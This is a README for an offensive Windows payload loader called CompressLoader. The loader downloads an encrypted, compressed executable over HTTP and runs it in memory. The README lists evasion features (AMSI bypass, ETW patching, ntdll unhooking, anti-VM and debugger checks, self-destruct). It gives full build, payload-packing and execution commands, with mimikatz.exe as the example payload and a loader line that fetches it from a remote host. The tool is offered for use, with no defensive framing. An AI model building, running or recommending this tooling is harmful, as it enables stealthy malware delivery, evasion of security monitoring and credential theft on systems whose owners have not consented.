# CompressLoader

Download, decrypt, decompress, and reflectively load Windows PE payloads entirely in memory.

![C](https://img.shields.io/badge/C-00599C?style=for-the-badge&logo=c&logoColor=white) ![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white) ![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) [![Makefile](https://img.shields.io/badge/Makefile-%23000.svg?style=for-the-badge&logo=gnu&logoColor=white)](Makefile) [![License: AGPL v3](https://img.shields.io/badge/License-AGPLv3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)

## Architecture

```
      +----------+     +----------+     +----------+
      |  PE .exe | --> |   pack   | --> |  .lzss   |
      +----------+     +----------+     +----------+
                                            |
                                    +---------------+
                                    |  crypter.py   |
                                    | AES-256-CBC   |
                                    +---------------+
                                            |
                                     +--------------+
                                     | payload.bin  |
                                     +--------------+
                                            |
                                       [ HTTP(S) ]
                                            |
                              +-------------------------+
                              |    loader.exe (Win)     |
                              |  1. Download payload    |
                              |  2. AES-256 decrypt     |
                              |  3. LZSS decompress     |
                              |  4. Reflective PE load  |
                              |  5. Execute in memory   |
                              +-------------------------+
```

## Features

- **LZSS Compression** — Okumura algorithm (`pack.c` / `unpack.c` / `lzss.c`)
- **AES-256-CBC Encryption** — Payload encryption via Windows CryptoAPI
- **Reflective PE Loader** — IAT repair, base relocation, ntdll unhooking
- **Memory-only execution** — No file touches disk after download
- **Command-line masquerading** — Hooks `GetCommandLine`, `__p___argv`, etc.
- **Anti-analysis** — VM detection, debugger checks, minimum uptime/ram gates
- **Self-destruct** — Removes persistence artifacts and deletes the loader

### Loader variants

| File | Key differences |
|------|----------------|
| `loader.c` | Core loader: download + decrypt + LZSS + PE load |
| `loader2.c` | Adds Sleep hook + **memory fluctuation** (RW encryption of `.text`) |
| `loader3.c` | Adds **ntdll unhooking** + backward-compatible args (3 or 4) |
| `loader4.c` | Adds **ETW patching**, **AMSI bypass** (HW breakpoints), **string obfuscation** |

### Fluctuation modes (loader2/3/4)

| Mode | Description |
|------|-------------|
| `0` | No fluctuation (default) |
| `1` | RW fluctuation — encrypt `.text` while `Sleep()` is active |
| `2` | NOACCESS fluctuation + VEH — set `.text` to `PAGE_NOACCESS`, restore on access violation |

## Build

### Quick start (all targets)

```bash
make config    # verify dependencies
make all       # build LZSS tools + cross-compile loaders
make test      # LZSS roundtrip test
make payload PE_FILE=mimikatz.exe   # generate encrypted payload
make run       # serve payloads over HTTP
make install   # build + install loaders
```

### Available targets

| Target | Description |
|--------|-------------|
| `all` | Build everything (pack-tools + loaders) |
| `pack-tools` | Build `pack`, `unpack`, `lzss-test` (Linux native) |
| `loaders` | Cross-compile `loader*.exe` (Windows, via mingw-w64) |
| `config` | Check build dependencies |
| `test` | Full LZSS roundtrip (generate -> pack -> unpack -> verify) |
| `payload` | Build encrypted payload via `crypter.py` (`PE_FILE=...` required) |
| `install` | Build + copy loaders to `INSTALL_DIR` (default: `~/LazyOwn/sessions`) |
| `uninstall` | Remove installed loaders |
| `run` / `serve` | Serve `payloads/` over HTTP on port 8080 |
| `clean` | Remove build artifacts |
| `distclean` | Clean everything including payloads |
| `info` / `help` | Show config and targets |

Variables: `INSTALL_DIR`, `PE_FILE`, `SERVER_PORT`, `TEST_SIZE`

### Loaders (Windows PE) — manual

```bash
# Requires mingw-w64
sudo apt install mingw-w64

x86_64-w64-mingw32-gcc loader.c  -o loader.exe  -lwinhttp -lcrypt32 -lpsapi -static -s -O2
x86_64-w64-mingw32-gcc loader2.c -o loader2.exe -lwinhttp -lcrypt32 -lpsapi -static -s -O2
x86_64-w64-mingw32-gcc loader3.c -o loader3.exe -lwinhttp -lcrypt32 -lpsapi -static -s -O2
x86_64-w64-mingw32-gcc loader4.c -o loader4.exe -lwinhttp -lcrypt32 -lpsapi -static -s -O2
```

Or use the provided script:

```bash
bash install.sh
```

### LZSS tools (Linux host) — manual

```bash
gcc lzss.c pack.c   -o pack   -O2
gcc lzss.c unpack.c -o unpack -O2
gcc lzss.c test.c   -o lzss-test -O2
```

## Usage

### 1. Create payload

```bash
# Compress + encrypt a PE file
python3 crypter.py mimikatz.exe

# Or use an already-compressed LZSS file
python3 crypter.py mimikatz.exe custom.lzss
```

Generates `payload.bin` containing: `[keyLen][key][peOrigSize][cipherLen][ciphertext]`

### 2. Host payload

Serve `payload.bin` on any HTTP server reachable from the target.

### 3. Execute loader

```bash
# Basic
loader.exe <host> <port> <resource>

# Fluctuation mode
loader2.exe <host> <port> <resource> <mode>
loader3.exe <host> <port> <resource> [mode]
loader4.exe <host> <port> <resource> [mode]
```

Example:

```bash
loader3.exe 192.168.1.100 8080 /payload.bin 2
```

## Files

| File | Purpose |
|------|---------|
| `loader.c` | Core PE loader (WinHTTP download + AES decrypt + LZSS decompress + reflective load) |
| `loader2.c` | Loader + Sleep hook + memory fluctuation |
| `loader3.c` | Loader + fluctuation + ntdll unhooking |
| `loader4.c` | Loader + fluctuation + unhooking + ETW patch + AMSI bypass + string obfuscation |
| `lzss.c` | LZSS compress/decompress implementation (Okumura) |
| `pack.c` | CLI wrapper for LZSS compression |
| `unpack.c` | CLI wrapper for LZSS decompression |
| `test.c` | LZSS decompression test |
| `aes.c` / `aes.h` | Tiny AES-C implementation (standalone) |
| `crypter.py` | Payload builder: compress + AES encrypt + package |
| `Makefile` | Full lifecycle: build, test, payload, install, serve |
| `install.sh` | Cross-compile all loaders with mingw-w64 |
| `requirements.txt` | Python dependencies |

## License

AGPL v3 — see [LICENSE](LICENSE)
